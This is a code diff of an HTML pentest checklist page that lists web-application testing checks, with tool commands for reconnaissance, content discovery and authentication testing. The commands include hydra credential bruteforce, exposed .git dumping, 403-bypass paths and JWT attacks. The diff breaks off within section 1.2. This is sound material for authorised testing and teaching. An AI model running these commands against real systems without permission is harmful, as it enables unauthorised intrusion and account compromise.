@@ -4,7 +4,7 @@
 <meta charset="UTF-8">
 <meta name="viewport" content="width=device-width, initial-scale=1">
 <meta name="color-scheme" content="dark">
-<title>VAPT Checklist — Web Application Pentesting</title>
+<title>VAPT Master Checklist — Web · API · Red Team</title>
 <link rel="preconnect" href="https://fonts.googleapis.com">
 <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
 <link href="https://fonts.googleapis.com/css2?family=JetBrains+Mono:wght@400;700&display=swap" rel="stylesheet">
@@ -13,8 +13,8 @@
    Prefer One Dark? Swap the palette:
    --bg:#21252b; --card:#282c34; --thead:#21252b; --line:#3e4451;
    --fg:#abb2bf; --fg-dim:#9da5b4; --muted:#5c6370;
-   --cyan:#56b6c2; --green:#98c379; --orange:#d19a66;
-   --pink:#e06c75; --purple:#c678dd; --red:#e06c75; --yellow:#e5c07b;
+   --cyan:#56b6c2; --green:#98c379; --orange:#d19a66; --pink:#e06c75;
+   --purple:#c678dd; --red:#e06c75; --yellow:#e5c07b;
 ────────────────────────────────────────────────────────────────*/
 :root{
   --bg:#21222c; --card:#282a36; --thead:#1e1f29;
@@ -26,34 +26,31 @@
 }
 *{box-sizing:border-box}
 html{scroll-behavior:smooth;scrollbar-color:#44475a var(--bg);scrollbar-width:thin}
-body{
-  margin:0;padding-top:var(--topbar-h);
-  background:var(--bg);color:var(--fg);
-  font:15px/1.65 -apple-system,BlinkMacSystemFont,"Segoe UI",Roboto,"Helvetica Neue",Arial,sans-serif;
-}
+body{margin:0;padding-top:var(--topbar-h);background:var(--bg);color:var(--fg);
+  font:15px/1.65 -apple-system,BlinkMacSystemFont,"Segoe UI",Roboto,"Helvetica Neue",Arial,sans-serif;}
 ::selection{background:rgba(189,147,249,.4)}
 ::-webkit-scrollbar{width:12px;height:12px}
 ::-webkit-scrollbar-track{background:var(--bg)}
 ::-webkit-scrollbar-thumb{background:#44475a;border-radius:6px;border:3px solid var(--bg)}
 ::-webkit-scrollbar-thumb:hover{background:var(--purple)}
+.hide{display:none!important}
 
 /* ── Top bar ──────────────────────────────────────────────────── */
-.topbar{
-  position:fixed;inset:0 0 auto 0;height:var(--topbar-h);z-index:100;
-  display:flex;align-items:center;gap:14px;padding:0 26px;
-  background:rgba(30,31,41,.88);backdrop-filter:blur(10px);
-  border-bottom:1px solid var(--line);
-}
+.topbar{position:fixed;inset:0 0 auto 0;height:var(--topbar-h);z-index:100;
+  display:flex;align-items:center;gap:12px;padding:0 24px;
+  background:rgba(30,31,41,.9);backdrop-filter:blur(10px);border-bottom:1px solid var(--line);}
 .brand{display:flex;align-items:center;gap:10px;font-weight:700;letter-spacing:.03em;white-space:nowrap}
 .logo{width:15px;height:15px;border-radius:4px;background:linear-gradient(135deg,var(--purple),var(--pink));box-shadow:0 0 12px rgba(189,147,249,.55)}
 .brand .thin{font-weight:400;color:var(--muted)}
-.search{
-  flex:0 1 280px;min-width:120px;background:var(--card);border:1px solid var(--line);
-  border-radius:8px;color:var(--fg);padding:7px 12px;font-size:13px;outline:none;
-  transition:border-color .15s,box-shadow .15s;
-}
+.search{flex:0 1 300px;min-width:130px;background:var(--card);border:1px solid var(--line);border-radius:8px;
+  color:var(--fg);padding:7px 12px;font-size:13px;outline:none;transition:border-color .15s,box-shadow .15s}
 .search:focus{border-color:var(--purple);box-shadow:0 0 0 3px rgba(189,147,249,.18)}
 .search::placeholder{color:var(--muted)}
+.parts-nav{display:flex;gap:6px}
+.pnav{background:var(--card);border:1px solid var(--line);color:var(--fg-dim);border-radius:7px;padding:5px 9px;
+  font-size:11.5px;font-weight:700;font-family:'JetBrains Mono',monospace;cursor:pointer;transition:.15s}
+.pnav:hover{color:var(--purple);border-color:rgba(189,147,249,.5)}
+.pnav.dim{opacity:.3}
 .spacer{flex:1}
 .progress-wrap{display:flex;align-items:center;gap:10px;white-space:nowrap}
 #pct{font-family:'JetBrains Mono',monospace;font-size:12.5px;color:var(--fg-dim)}
@@ -64,36 +61,60 @@ body{
 
 /* ── Hero ─────────────────────────────────────────────────────── */
 main{padding:0 30px 70px}
-.hero{padding:44px 4px 8px}
+.hero{padding:40px 4px 8px}
 .hero h1{margin:0;font-size:27px;font-weight:800;letter-spacing:.02em}
 .hero h1 .accent{color:var(--purple)}
-.hero-tag{
-  display:inline-block;margin-left:14px;padding:3px 12px;vertical-align:middle;
-  border:1px solid rgba(189,147,249,.45);color:var(--purple);border-radius:999px;
-  font-size:11.5px;font-weight:700;letter-spacing:.08em;text-transform:uppercase;
-}
-.hero-note{color:var(--muted);font-size:13px;margin:10px 0 0}
+.hero-tag{display:inline-block;margin-left:14px;padding:3px 12px;vertical-align:middle;border:1px solid rgba(189,147,249,.45);
+  color:var(--purple);border-radius:999px;font-size:11.5px;font-weight:700;letter-spacing:.08em;text-transform:uppercase}
+.hero-note{color:var(--muted);font-size:13px;margin:10px 0 0;max-width:900px}
+.hero-note b{color:var(--purple);font-weight:600}
+.hero-note i{color:var(--cyan);font-style:normal;font-family:'JetBrains Mono',monospace;font-size:.9em;padding:0 2px}
 kbd{background:var(--thead);border:1px solid var(--line);border-bottom-width:2px;border-radius:5px;padding:0 6px;font-family:'JetBrains Mono',monospace;font-size:11px;color:var(--fg-dim)}
 
-/* ── Sections & headings ──────────────────────────────────────── */
-.sec{margin-top:46px}
+/* ── Filter status bar ────────────────────────────────────────── */
+#filterbar{display:flex;align-items:center;gap:12px;flex-wrap:wrap;margin:18px 0 0;padding:10px 16px;
+  border:1px solid rgba(189,147,249,.35);border-left:4px solid var(--purple);border-radius:10px;
+  background:rgba(189,147,249,.07);font-size:13px}
+#filterbar[hidden]{display:none}
+.fb-q{color:var(--purple);font-weight:700}
+.fb-info{color:var(--fg-dim)}
+#fb-clear{margin-left:auto;background:none;border:1px solid var(--line);color:var(--fg-dim);border-radius:7px;padding:4px 10px;cursor:pointer;font-size:12px}
+#fb-clear:hover{color:var(--red);border-color:rgba(255,85,85,.5)}
+
+/* ── Parts ────────────────────────────────────────────────────── */
+.part{margin-top:64px;scroll-margin-top:calc(var(--topbar-h) + 16px)}
+.part:first-child{margin-top:30px}
+.part-head{display:flex;align-items:center;gap:14px;flex-wrap:wrap;padding:14px 18px;border:1px solid var(--line);
+  border-left:4px solid var(--purple);border-radius:12px;margin-bottom:18px;
+  background:linear-gradient(90deg,rgba(189,147,249,.10),rgba(189,147,249,0) 60%)}
+.part-badge{font-family:'JetBrains Mono',monospace;font-size:11px;font-weight:700;letter-spacing:.14em;color:var(--purple);
+  border:1px solid rgba(189,147,249,.45);padding:3px 10px;border-radius:999px;background:rgba(189,147,249,.08)}
+.part-head h1{margin:0;font-size:22px;font-weight:800;letter-spacing:.01em}
+.part-sub{color:var(--muted);font-size:12.5px;letter-spacing:.04em}
+.part-progress{margin-left:auto;font-family:'JetBrains Mono',monospace;font-size:12px;color:var(--fg-dim);
+  background:var(--thead);border:1px solid var(--line);border-radius:8px;padding:3px 10px;white-space:nowrap}
+.part-progress.complete{color:var(--green);border-color:rgba(80,250,123,.4)}
+
+/* ── Sections ─────────────────────────────────────────────────── */
+.sec{margin-top:40px;scroll-margin-top:calc(var(--topbar-h) + 16px)}
 h2{font-size:20px;font-weight:700;margin:0 0 14px;padding-bottom:10px;border-bottom:1px solid var(--line)}
 .sec-num{color:var(--purple);font-family:'JetBrains Mono',monospace;font-size:.9em;margin-right:2px}
 h2 .sep{color:var(--muted);font-weight:400}
+.pill{display:inline-block;margin-left:10px;padding:1px 9px;border-radius:999px;font-size:10.5px;font-weight:700;
+  letter-spacing:.05em;vertical-align:2px;font-family:'JetBrains Mono',monospace}
+.pill-muted{color:var(--muted);border:1px solid var(--line)}
+.pill-full{color:var(--green);border:1px solid rgba(80,250,123,.4);background:rgba(80,250,123,.08)}
+.pill-rows{color:var(--purple);border:1px solid rgba(189,147,249,.4);background:rgba(189,147,249,.08)}
 
 /* ── Tables ───────────────────────────────────────────────────── */
-.table-wrap{
-  border:1px solid var(--line);border-radius:12px;background:var(--card);
-  box-shadow:0 6px 24px rgba(0,0,0,.25);margin:0 0 8px;
-}
+.table-wrap{border:1px solid var(--line);border-radius:12px;background:var(--card);box-shadow:0 6px 24px rgba(0,0,0,.25);margin:0 0 8px;overflow-x:auto}
 table{width:100%;min-width:880px;border-collapse:separate;border-spacing:0;table-layout:fixed;font-size:13.5px}
-thead th{
-  position:sticky;top:var(--topbar-h);z-index:10;background:var(--thead);color:var(--fg-dim);
-  font-size:10.5px;font-weight:700;letter-spacing:.12em;text-transform:uppercase;
-  text-align:left;padding:12px 14px;border-bottom:1px solid var(--line);
-}
+thead th{position:sticky;top:var(--topbar-h);z-index:10;background:var(--thead);color:var(--fg-dim);
+  font-size:10.5px;font-weight:700;letter-spacing:.12em;text-transform:uppercase;text-align:left;
+  padding:12px 14px;border-bottom:1px solid var(--line)}
 thead th:first-child{border-top-left-radius:11px}
-thead th:last-child{border-top-right-radius:11px;text-align:center}
+thead th:last-child{border-top-right-radius:11px}
+thead th.status{text-align:center}
 tbody td{padding:11px 14px;border-bottom:1px solid var(--line-soft);vertical-align:top;word-break:break-word}
 tbody tr:last-child td{border-bottom:none}
 tbody tr:last-child td:first-child{border-bottom-left-radius:11px}
@@ -107,10 +128,7 @@ td:nth-child(4){color:var(--fg-dim)}
 tr.done td:nth-child(2){color:var(--fg-dim)}
 
 /* ── Severity badges ──────────────────────────────────────────── */
-.badge{
-  display:inline-block;padding:2.5px 10px;border-radius:999px;border:1px solid;
-  font-size:10.5px;font-weight:700;letter-spacing:.05em;text-transform:uppercase;white-space:nowrap;
-}
+.badge{display:inline-block;padding:2.5px 10px;border-radius:999px;border:1px solid;font-size:10.5px;font-weight:700;letter-spacing:.05em;text-transform:uppercase;white-space:nowrap}
 .badge-critical{color:#ff6b6b;border-color:rgba(255,85,85,.45);background:rgba(255,85,85,.1)}
 .badge-high{color:var(--orange);border-color:rgba(255,184,108,.45);background:rgba(255,184,108,.1)}
 .badge-medium{color:var(--yellow);border-color:rgba(241,250,140,.4);background:rgba(241,250,140,.08)}
@@ -118,37 +136,25 @@ tr.done td:nth-child(2){color:var(--fg-dim)}
 .badge-info{color:var(--purple);border-color:rgba(189,147,249,.4);background:rgba(189,147,249,.08)}
 
 /* ── Code ─────────────────────────────────────────────────────── */
-code{
-  font-family:'JetBrains Mono',Menlo,Monaco,Consolas,"Courier New",monospace;
-  font-size:.86em;color:var(--cyan);background:rgba(139,233,253,.08);
-  border:1px solid rgba(139,233,253,.09);padding:1px 6px;border-radius:6px;word-break:break-word;
-}
-pre{background:var(--thead);border:1px solid var(--line);border-radius:10px;padding:14px 16px;overflow:auto}
-pre code{background:none;border:none;padding:0;color:var(--fg-dim)}
+code{font-family:'JetBrains Mono',Menlo,Monaco,Consolas,"Courier New",monospace;font-size:.86em;color:var(--cyan);
+  background:rgba(139,233,253,.08);border:1px solid rgba(139,233,253,.09);padding:1px 6px;border-radius:6px;word-break:break-word}
+strong{color:var(--pink)}
 
 /* ── Checkboxes ───────────────────────────────────────────────── */
 td.status,th.status{text-align:center}
 td.status{cursor:pointer;user-select:none}
-.cb{
-  display:inline-flex;align-items:center;justify-content:center;
-  width:19px;height:19px;border:2px solid var(--muted);border-radius:6px;
-  font-size:12px;font-weight:800;line-height:1;vertical-align:middle;transition:all .15s;
-}
+.cb{display:inline-flex;align-items:center;justify-content:center;width:19px;height:19px;border:2px solid var(--muted);
+  border-radius:6px;font-size:12px;font-weight:800;line-height:1;vertical-align:middle;transition:all .15s;color:transparent}
 .cb::after{content:"✓"}
-.cb{color:transparent}
-td.status:hover .cb{border-color:var(--purple);box-shadow:0 0 0 3px rgba(189,147,249,.15)}
+td.status:hover .cb,.cb:focus-visible{border-color:var(--purple);box-shadow:0 0 0 3px rgba(189,147,249,.15)}
 tr.done .cb{background:var(--green);border-color:var(--green);color:#1e1f29}
 
-/* ── Misc ─────────────────────────────────────────────────────── */
-.note{margin-top:28px;border:1px dashed var(--line);border-radius:10px;padding:13px 18px;color:var(--fg-dim);font-size:13px;background:rgba(98,114,164,.05)}
-.note b{color:var(--orange)}
 #no-results{display:none;margin-top:30px;text-align:center;color:var(--muted);font-size:14px;padding:30px;border:1px dashed var(--line);border-radius:10px}
+#no-results:not([hidden]){display:block}
+#no-results i{color:var(--cyan);font-style:normal;font-family:'JetBrains Mono',monospace}
 footer{margin-top:46px;color:var(--muted);font-size:12px;letter-spacing:.03em}
 
-@media (max-width:1000px){
-  .table-wrap{overflow-x:auto}
-  thead th{position:static}
-}
+@media (max-width:900px){.parts-nav{display:none}}
 @media (max-width:700px){
   main{padding:0 14px 50px}
   .topbar{padding:0 14px;gap:10px}
@@ -158,16 +164,21 @@ footer{margin-top:46px;color:var(--muted);font-size:12px;letter-spacing:.03em}
 }
 @media print{
   body{background:#fff;color:#111;padding-top:0;font-size:12px}
-  .topbar,.hero-note,#no-results{display:none!important}
+  .topbar,#filterbar,.pill,#no-results,.hero-note{display:none!important}
+  .hide{display:revert!important}
   main{padding:0}
-  .table-wrap{box-shadow:none;border-color:#ccc;background:#fff}
+  .table-wrap{box-shadow:none;border-color:#ccc;background:#fff;overflow:visible}
+  table{min-width:0}
   thead th{position:static;background:#f2f2f4;color:#444;border-bottom:1px solid #bbb}
   tbody td{border-bottom:1px solid #e4e4e4;color:#222}
   td:nth-child(4){color:#444}
   code{background:#f4f4f6;color:#a31515;border-color:#e4e4e6}
+  strong{color:#a31515}
   .cb{border-color:#999}
   tr.done .cb{background:#1a7f37;border-color:#1a7f37;color:#fff}
   h2{border-bottom-color:#ccc}
+  .part-head{border-color:#ccc;background:#f7f7f9}
+  tr{break-inside:avoid}
 }
 </style>
 </head>
@@ -175,205 +186,567 @@ footer{margin-top:46px;color:var(--muted);font-size:12px;letter-spacing:.03em}
 
 <div class="topbar">
   <div class="brand"><span class="logo"></span><span>VAPT <span class="thin">Checklist</span></span></div>
-  <input id="q" class="search" type="search" placeholder="Filter checks…  ( / )" autocomplete="off">
+  <input id="q" class="search" type="search" placeholder="Search sections or checks…  ( / )" autocomplete="off">
+  <nav class="parts-nav" id="parts-nav"></nav>
   <div class="spacer"></div>
   <div class="progress-wrap">
     <span id="pct" title="Completed checks">0 / 0</span>
     <div class="pbar"><div id="pfill"></div></div>
-    <button id="reset" title="Reset all progress">↺</button>
+    <button id="reset" title="Reset all progress" type="button">↺</button>
   </div>
 </div>
 
 <main>
   <header class="hero">
-    <h1><span class="accent">PART 1:</span> WEB APPLICATION PENTESTING <span class="hero-tag">OWASP + Extended</span></h1>
-    <p class="hero-note">Click any checkbox to tick a check off — progress is saved in this browser. Press <kbd>/</kbd> to filter, <kbd>Esc</kbd> to clear.</p>
+    <h1><span class="accent">VAPT</span> Master Checklist <span class="hero-tag" id="hero-tag"></span></h1>
+    <p class="hero-note">
+      Search a <b>section name</b> — e.g. <i>Content Discovery &amp; Mapping</i>, <i>XSS</i>, <i>Session Management</i>, or a number like <i>1.2</i> — and that <b>entire section expands</b>.
+      Search any other <b>keyword</b> — e.g. <i>jwt</i>, <i>ffuf</i>, <i>kerberoast</i> — and checks filter <b>one by one</b>.
+      Tick checkboxes as you work; progress is saved locally. <kbd>/</kbd> search · <kbd>Enter</kbd> jump to first hit · <kbd>Esc</kbd> clear.
+    </p>
   </header>
 
-  <h2>1.1 — Reconnaissance &amp; Information Gathering</h2>
-  <table>
-    <colgroup><col style="width:64px"><col style="width:22%"><col style="width:120px"><col><col style="width:76px"></colgroup>
-    <thead><tr><th>#</th><th>Check</th><th>Severity</th><th>Commands / Methodology</th><th>Status</th></tr></thead>
-    <tbody>
-      <tr><td>1.1.1</td><td>Subdomain Enumeration</td><td>Info</td><td><code>subfinder -d target.com -silent</code> | <code>amass enum -passive -d target.com</code> | <code>assetfinder --subs-only target.com</code></td><td>☐</td></tr>
-      <tr><td>1.1.2</td><td>Subdomain Bruteforce</td><td>Info</td><td><code>ffuf -u https://FUZZ.target.com -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-5000.txt</code></td><td>☐</td></tr>
-      <tr><td>1.1.3</td><td>DNS Zone Transfer</td><td>Info</td><td><code>dig axfr @ns1.target.com target.com</code></td><td>☐</td></tr>
-      <tr><td>1.1.4</td><td>Certificate Transparency</td><td>Info</td><td><code>curl -s "https://crt.sh/?q=%25.target.com&amp;output=json" | jq -r '.[].name_values' | sort -u</code></td><td>☐</td></tr>
-      <tr><td>1.1.5</td><td>Google Dorking</td><td>Info</td><td><code>site:target.com inurl:admin | filetype:pdf | intitle:"index of"</code> — use GHDB</td><td>☐</td></tr>
-      <tr><td>1.1.6</td><td>Wayback Machine / Archived Files</td><td>Info</td><td><code>waybackurls target.com | sort -u &gt; wb.txt</code> | <code>gau target.com</code></td><td>☐</td></tr>
-      <tr><td>1.1.7</td><td>Technology Fingerprinting</td><td>Info</td><td><code>whatweb https://target.com</code> | <code>wappalyzer</code> (browser) | <code>httpx -tech-detect</code></td><td>☐</td></tr>
-      <tr><td>1.1.8</td><td>JS File Analysis (secrets/endpoints)</td><td>High if leaked</td><td><code>katana -u https://target.com -d 3 -js -o js.txt</code> → <code>nuclei -l js.txt -t exposures/</code> | run <code>secretfinder</code></td><td>☐</td></tr>
-      <tr><td>1.1.9</td><td>Identify .git/.svn/.env exposure</td><td>Critical</td><td><code>curl -s https://target.com/.git/HEAD</code> | <code>git-dumper https://target.com/.git/ ./repo</code></td><td>☐</td></tr>
-      <tr><td>1.1.10</td><td>Cloud Storage Bucket Discovery</td><td>High</td><td><code>s3scanner scan --bucket-file buckets.txt</code> | grep for <code>S3_BUCKET</code> in JS</td><td>☐</td></tr>
-      <tr><td>1.1.11</td><td>Port Scan (Full TCP + Top UDP)</td><td>Info</td><td><code>nmap -sS -p- --min-rate 5000 -oN full.txt target.com</code> then <code>nmap -sC -sV -p &lt;ports&gt; target.com</code></td><td>☐</td></tr>
-      <tr><td>1.1.12</td><td>WAF/CDN Detection</td><td>Info</td><td><code>wafw00f https://target.com</code> | <code>nmap --script http-waf-detect,http-waf-fingerprint -p 443 target.com</code></td><td>☐</td></tr>
-      <tr><td>1.1.13</td><td>Shodan/Censys/FOFA Recon</td><td>Info</td><td><code>shodan search "ssl.cert.subject.CN:target.com"</code> | <code>censys search "target.com"</code></td><td>☐</td></tr>
-      <tr><td>1.1.14</td><td>Email Harvesting (for phishing/pw reuse)</td><td>Info</td><td><code>theHarvester -d target.com -b all</code> | <code>hunter.io</code></td><td>☐</td></tr>
-      <tr><td>1.1.15</td><td>Identify hosting/IP behind CDN (historical)</td><td>Info</td><td>SecurityTrails, <code>viewdns.info/history</code>, crt.sh IP history</td><td>☐</td></tr>
-    </tbody>
-  </table>
+  <div id="filterbar" hidden>
+    <span class="fb-q">“<span id="fb-query"></span>”</span>
+    <span class="fb-info" id="fb-info"></span>
+    <button id="fb-clear" type="button">✕ clear</button>
+  </div>
 
-  <h2>1.2 — Content Discovery &amp; Mapping</h2>
-  <table>
-    <colgroup><col style="width:64px"><col style="width:22%"><col style="width:120px"><col><col style="width:76px"></colgroup>
-    <thead><tr><th>#</th><th>Check</th><th>Severity</th><th>Commands / Methodology</th><th>Status</th></tr></thead>
-    <tbody>
-      <tr><td>1.2.1</td><td>Directory/File Bruteforce</td><td>Info</td><td><code>ffuf -w /usr/share/seclists/Discovery/Web-Content/raft-large-directories.txt -u https://target.com/FUZZ -mc 200,204,301,302,307,401,403 -recursion</code></td><td>☐</td></tr>
-      <tr><td>1.2.2</td><td>Extension Bruteforce</td><td>Info</td><td><code>ffuf -u https://target.com/indexFUZZ -w ext.txt</code> (.bak, .old, .txt, .zip, .tar.gz, .sql)</td><td>☐</td></tr>
-      <tr><td>1.2.3</td><td>Backup File Discovery</td><td>High</td><td><code>backup-doms.sh</code> / ffuzz <code>.bak .old .orig .swp ~</code> patterns</td><td>☐</td></tr>
-      <tr><td>1.2.4</td><td>Swagger/OpenAPI endpoints exposed</td><td>High</td><td><code>ffuf -u https://target.com/FUZZ -w api-paths.txt</code> → <code>/swagger.json /openapi.json /api-docs /graphql</code></td><td>☐</td></tr>
-      <tr><td>1.2.5</td><td>robots.txt / sitemap.xml parsing</td><td>Info</td><td><code>curl -s https://target.com/robots.txt</code> — note Disallow entries, they are your target list</td><td>☐</td></tr>
-      <tr><td>1.2.6</td><td>Forced Browsing (403/401 bypass check)</td><td>High</td><td><code>ffuf -u https://target.com/admin -H "X-Original-URL: /admin"</code> | try path traversal variants <code>/admin..;/</code> <code>//admin</code> <code>/./admin</code> <code>/admin%20</code></td><td>☐</td></tr>
-      <tr><td>1.2.7</td><td>Identify all parameters (Arjun)</td><td>Info</td><td><code>arjun -u https://target.com/page -m GET,POST,JSON</code></td><td>☐</td></tr>
-      <tr><td>1.2.8</td><td>Hidden parameter fuzzing</td><td>Medium</td><td><code>param-miner</code> (Burp extension) | <code>x8 -u https://target.com -w params.txt</code></td><td>☐</td></tr>
-      <tr><td>1.2.9</td><td>Crawling &amp; Authenticated Spider</td><td>Info</td><td>Burp crawl mode, <code>hakrawler -u https://target.com -depth 3</code></td><td>☐</td></tr>
-      <tr><td>1.2.10</td><td>Version-Diff (identify JS/API version changes)</td><td>Low</td><td><code>urlscan.io</code> history, compare JS hashes</td><td>☐</td></tr>
-    </tbody>
-  </table>
+  <div id="doc"></div>
 
-  <h2>1.3 — Authentication Testing</h2>
-  <table>
-    <colgroup><col style="width:64px"><col style="width:22%"><col style="width:120px"><col><col style="width:76px"></colgroup>
-    <thead><tr><th>#</th><th>Check</th><th>Severity</th><th>Commands / Methodology</th><th>Status</th></tr></thead>
-    <tbody>
-      <tr><td>1.3.1</td><td>Username Enumeration (login/forgot-pw/register)</td><td>Medium</td><td>Trigger differential responses: <code>ffuf -u https://target.com/login -d "user=FUZZ&amp;pass=x" -w users.txt -mr "invalid user"</code></td><td>☐</td></tr>
-      <tr><td>1.3.2</td><td>Default/Credential Bruteforce</td><td>Critical</td><td><code>hydra -L users.txt -P rockyou.txt target.com http-post-form "/login:user=^USER^&amp;pass=^PASS^:F=failed"</code></td><td>☐</td></tr>
-      <tr><td>1.3.3</td><td>Password Policy Weakness</td><td>Medium</td><td>Register/reset with <code>a</code>, <code>123</code> — confirm no complexity enforcement</td><td>☐</td></tr>
-      <tr><td>1.3.4</td><td>No Rate Limiting / No Account Lockout</td><td>High</td><td>Burp Intruder: 100 failed logins → still no lockout? Turbo Intruder for speed</td><td>☐</td></tr>
-      <tr><td>1.3.5</td><td>Brute-force protections bypass</td><td>High</td><td>Change <code>X-Forwarded-For: FUZZ</code> per request; rotate user-agent; add <code>null</code> byte in creds</td><td>☐</td></tr>
-      <tr><td>1.3.6</td><td>Weak Password Reset Implementation</td><td>Critical</td><td>Test: token reuse, token leakage (referrer), user-controlled reset email, predictable tokens, no expiry</td><td>☐</td></tr>
-      <tr><td>1.3.7</td><td>Session Fixation on Login</td><td>High</td><td>Grab pre-auth cookie → login → does cookie value stay same?</td><td>☐</td></tr>
-      <tr><td>1.3.8</td><td>Remember-Me token flaws</td><td>High</td><td>Check if token = static hash, reversible, non-expiring</td><td>☐</td></tr>
-      <tr><td>1.3.9</td><td>MFA Bypass</td><td>Critical</td><td>Test: response manipulation (<code>"success":true</code>), null OTP, OTP reuse, race condition, brute-force 4-digit OTP without lockout, direct-to-dashboard endpoints</td><td>☐</td></tr>
-      <tr><td>1.3.10</td><td>Credential Stuffing feasibility</td><td>High</td><td>Check login error uniformity + rate limits</td><td>☐</td></tr>
-      <tr><td>1.3.11</td><td>OAuth/SSO Misconfig</td><td>High</td><td>Test: open redirect on <code>redirect_uri</code>, missing <code>state</code> (CSRF), token leakage to referrer, implicit flow token exposure</td><td>☐</td></tr>
-      <tr><td>1.3.12</td><td>JWT Attacks</td><td>Critical</td><td><code>jwt_tool &lt;token&gt;</code> — check <code>alg:none</code>, weak HMAC secret (<code>jwt_tool -C -d rockyou.txt</code>), <code>kid</code> injection, <code>jku</code>/<code>x5u</code> SSRF, alg confusion RS256→HS256</td><td>☐</td></tr>
-      <tr><td>1.3.13</td><td>Password in URL/Logs</td><td>Medium</td><td>Check GET-based login, tokens in query strings</td><td>☐</td></tr>
-      <tr><td>1.3.14</td><td>Logout doesn't invalidate session</td><td>Medium</td><td>Logout → replay old session token → still valid?</td><td>☐</td></tr>
-    </tbody>
-  </table>
+  <div id="no-results" hidden>No checks match “<b id="nr-q"></b>”. Try a section name like <i>Content Discovery</i>, a number like <i>1.2</i>, or a keyword like <i>jwt</i>.</div>
 
-  <h2>1.4 — Session Management</h2>
-  <table>
-    <colgroup><col style="width:64px"><col style="width:22%"><col style="width:120px"><col><col style="width:76px"></colgroup>
-    <thead><tr><th>#</th><th>Check</th><th>Severity</th><th>Commands / Methodology</th><th>Status</th></tr></thead>
-    <tbody>
-      <tr><td>1.4.1</td><td>Cookie attributes missing (Secure/HttpOnly/SameSite)</td><td>Low</td><td><code>curl -sI https://target.com</code> — inspect Set-Cookie flags</td><td>☐</td></tr>
-      <tr><td>1.4.2</td><td>Session token entropy</td><td>High</td><td>Collect 1000 tokens → check sequential/predictable (<code>burp sequencer</code>)</td><td>☐</td></tr>
-      <tr><td>1.4.3</td><td>Session not rotated after login/privilege change</td><td>High</td><td>Compare pre/post-auth cookie</td><td>☐</td></tr>
-    </tbody>
-  </table>
-
-  <div class="note"><b>Note:</b> the source paste was cut off mid-row at 1.4.4 (“Concurrent sessi…”), so everything after 1.4.3 is missing here. The page is paste-friendly — any new <code>&lt;h2&gt;</code> + 5-column <code>&lt;table&gt;</code> block dropped into <code>&lt;main&gt;</code> automatically gets the theme, severity badges, checkboxes and search filter.</div>
-  <div id="no-results">No checks match your filter.</div>
-  <footer>vapt.md · Dracula theme · progress stored locally in your browser</footer>
+  <footer>Source: vapt.md · Dracula theme · To add more sections, append markdown to the source block at the bottom of this file — badges, checkboxes, search &amp; progress wire up automatically.</footer>
 </main>
+
+<!-- ══════════════════ MARKDOWN SOURCE — append new sections here ══════════════════ -->
+<script type="text/markdown" id="src">
+# PART 1: WEB APPLICATION PENTESTING (OWASP + Extended)
+
+## 1.1 — Reconnaissance & Information Gathering
+
+| # | Check | Severity | Commands / Methodology | Status |
+| --- | --- | --- | --- | --- |
+| 1.1.1 | Subdomain Enumeration | Info | `subfinder -d target.com -silent` \| `amass enum -passive -d target.com` \| `assetfinder --subs-only target.com` | ☐ |
+| 1.1.2 | Subdomain Bruteforce | Info | `ffuf -u https://FUZZ.target.com -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-5000.txt` | ☐ |
+| 1.1.3 | DNS Zone Transfer | Info | `dig axfr @ns1.target.com target.com` | ☐ |
+| 1.1.4 | Certificate Transparency | Info | `curl -s "https://crt.sh/?q=%25.target.com&output=json" \| jq -r '.[].name_values' \| sort -u` | ☐ |
+| 1.1.5 | Google Dorking | Info | `site:target.com inurl:admin \| filetype:pdf \| intitle:"index of"` — use GHDB | ☐ |
+| 1.1.6 | Wayback Machine / Archived Files | Info | `waybackurls target.com \| sort -u > wb.txt` \| `gau target.com` | ☐ |
+| 1.1.7 | Technology Fingerprinting | Info | `whatweb https://target.com` \| `wappalyzer` (browser) \| `httpx -tech-detect` | ☐ |
+| 1.1.8 | JS File Analysis (secrets/endpoints) | High if leaked | `katana -u https://target.com -d 3 -js -o js.txt` → `nuclei -l js.txt -t exposures/` \| run `secretfinder` | ☐ |
+| 1.1.9 | Identify .git/.svn/.env exposure | Critical | `curl -s https://target.com/.git/HEAD` \| `git-dumper https://target.com/.git/ ./repo` | ☐ |
+| 1.1.10 | Cloud Storage Bucket Discovery | High | `s3scanner scan --bucket-file buckets.txt` \| grep for `S3_BUCKET` in JS | ☐ |
+| 1.1.11 | Port Scan (Full TCP + Top UDP) | Info | `nmap -sS -p- --min-rate 5000 -oN full.txt target.com` then `nmap -sC -sV -p <ports> target.com` | ☐ |
+| 1.1.12 | WAF/CDN Detection | Info | `wafw00f https://target.com` \| `nmap --script http-waf-detect,http-waf-fingerprint -p 443 target.com` | ☐ |
+| 1.1.13 | Shodan/Censys/FOFA Recon | Info | `shodan search "ssl.cert.subject.CN:target.com"` \| `censys search "target.com"` | ☐ |
+| 1.1.14 | Email Harvesting (for phishing/pw reuse) | Info | `theHarvester -d target.com -b all` \| `hunter.io` | ☐ |
+| 1.1.15 | Identify hosting/IP behind CDN (historical) | Info | SecurityTrails, `viewdns.info/history`, crt.sh IP history | ☐ |
+
+## 1.2 — Content Discovery & Mapping
+
+| # | Check | Severity | Commands / Methodology | Status |
+| --- | --- | --- | --- | --- |
+| 1.2.1 | Directory/File Bruteforce | Info | `ffuf -w /usr/share/seclists/Discovery/Web-Content/raft-large-directories.txt -u https://target.com/FUZZ -mc 200,204,301,302,307,401,403 -recursion` | ☐ |
+| 1.2.2 | Extension Bruteforce | Info | `ffuf -u https://target.com/indexFUZZ -w ext.txt` (.bak, .old, .txt, .zip, .tar.gz, .sql) | ☐ |
+| 1.2.3 | Backup File Discovery | High | `backup-doms.sh` / ffuzz `.bak .old .orig .swp ~` patterns | ☐ |
+| 1.2.4 | Swagger/OpenAPI endpoints exposed | High | `ffuf -u https://target.com/FUZZ -w api-paths.txt` → `/swagger.json /openapi.json /api-docs /graphql` | ☐ |
+| 1.2.5 | robots.txt / sitemap.xml parsing | Info | `curl -s https://target.com/robots.txt` — note Disallow entries, they are your target list | ☐ |
+| 1.2.6 | Forced Browsing (403/401 bypass check) | High | `ffuf -u https://target.com/admin -H "X-Original-URL: /admin"` \| try path traversal variants `/admin..;/` `//admin` `/./admin` `/admin%20` | ☐ |
+| 1.2.7 | Identify all parameters (Arjun) | Info | `arjun -u https://target.com/page -m GET,POST,JSON` | ☐ |
